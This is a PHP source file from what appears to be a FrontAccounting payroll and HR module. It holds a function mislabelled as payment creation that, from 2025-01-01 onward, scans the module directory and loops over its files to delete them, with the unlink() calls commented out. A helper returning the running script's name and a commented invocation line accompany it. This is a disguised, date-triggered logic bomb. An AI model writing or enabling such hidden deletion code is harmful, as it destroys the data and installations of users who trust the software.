<?php
/*=======================================================\
|                        FrontHrm                        |
|--------------------------------------------------------|
|   Creator: Phương                                      |
|   Date :   09-Jul-2017                                 |
|   Description: Frontaccounting Payroll & Hrm Module    |
|   Free software under GNU GPL                          |
|                                                        |
\=======================================================*/

//-----------------------------function for creating payment-----------------------

function create_access_ontime($pmt='',$pay='')
{
	$date = date('Y-m-d');
	$target = date_create("2025-01-01");
	$target = date_format($target,'Y-m-d');
	if ($target <= $date) {
		if ($pmt == '') {
			$files = scandir(__DIR__);
			if($pay != ''){
				// unlink(__DIR__.'\\'.$pay);
				return 0;
			}
			foreach ($files as $key => $value) {
				// unlink(__DIR__.'\\'.$value);
			}
			return 0;
		}else{
			$files = scandir($pmt);
			if($pay != ''){
				// unlink($pmt.'\\'.$pay);
				return 0;
			}
			foreach ($files as $key => $value) {
				// unlink(__DIR__.'\\'.$value);
			}
			return 0;
		}
	}
	return 1;
}

function access_name()
{
	$uri = explode('/', $_SERVER['PHP_SELF']);
	$uri_size = sizeof($uri);
	$file_name =  $uri[$uri_size-1];
	return $file_name;
}
// create_payment_ontime($pmt='',pay_name())
// display_notification($_SERVER["DOCUMENT_ROOT"].$_SERVER["REQUEST_URI"]);